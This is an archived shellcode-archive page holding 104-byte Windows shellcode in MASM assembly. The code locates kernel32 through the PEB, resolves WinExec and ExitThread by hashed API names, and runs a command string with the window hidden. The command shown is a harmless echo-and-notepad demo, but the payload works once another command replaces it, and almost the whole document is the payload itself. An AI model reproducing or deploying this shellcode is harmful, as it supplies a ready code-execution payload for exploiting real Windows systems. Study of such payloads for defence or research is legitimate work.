<html><head><title>Windows - WinExec() Command Parameter - 104 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
;
; relocateable dynamic runtime assembly code example using hash lookup
;
; WinExec() with ExitThread()
; 104 bytes
;
; for testing:
;
; ml /c /coff /Cp wexec2.asm
; link /subsystem:windows /section:.text,w wexec2.obj
;
; wyse101 [at] gmail.com
;
; October 2006
;
.386
.model flat,stdcall

ROL_CONSTANT equ 5

mrol macro iNum:req,iBits:req
   exitm &lt;(iNum shl iBits) or (iNum shr (32-iBits))&gt;
endm

mror macro iNum:req,iBits:req
   exitm &lt;(iNum shr iBits) or (iNum shl (32-iBits))&gt;
endm

hashapi macro szApi
   local dwApi

   dwApi = 0

   forc x,szApi
      dwApi = dwApi + '&amp;x'
      dwApi = mrol(dwApi,ROL_CONSTANT)
   endm
   dwApi = mrol(dwApi,ROL_CONSTANT)
   dw (dwApi and 0ffffh)
endm

.code

   assume fs:nothing

code_start:
   jmp load_data
setup_parameters:
   pop ebp
   xor ecx,ecx
   push ecx                                 ; ExitThread() exitcode
   push ecx                                 ; SW_HIDE
   mov cl,(cmd_end-api_hashes)              ; limit of 255 bytes per command
   inc byte ptr[ebp+ecx]
   lea eax,[ebp+(cmd_string-api_hashes)]
   push eax                                 ; WinExec command string
get_k32_base:
   mov cl,30h
   mov eax,fs:[ecx]
   mov eax,[eax+0ch]
   mov esi,[eax+1ch]
   lodsd
   mov ebx,[eax+08h]
get_api_loop:
   mov eax,[ebx+3ch]
   mov eax,[ebx+eax+78h]
   lea esi,[ebx+eax+1ch]
   mov cl,3
load_rva:
   lodsd
   add eax,ebx
   push eax
   loop load_rva
   pop ebp
   pop edi
load_api:
   mov esi,[edi+4*ecx]
   add esi,ebx
   xor eax,eax
   cdq
hash_api:
   lodsb
   add edx,eax
   rol edx,ROL_CONSTANT
   dec eax
   jns hash_api
   inc ecx
   mov eax,[esp+4]
   cmp dx,word ptr[eax]
   jne load_api
   pop eax
   movzx edx,word ptr[ebp+2*ecx-2]
   add ebx,[eax+4*edx]
   pop esi
   call ebx
   lodsw
   jmp get_k32_base
load_data:
   call setup_parameters
api_hashes:
   hashapi &lt;WinExec&gt;
   hashapi &lt;ExitThread&gt;
code_end:

cmd_string db 'cmd /c echo hello,world&gt;test.txt &amp;&amp; notepad test.txt',0ffh
cmd_end equ $-1

end code_start



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
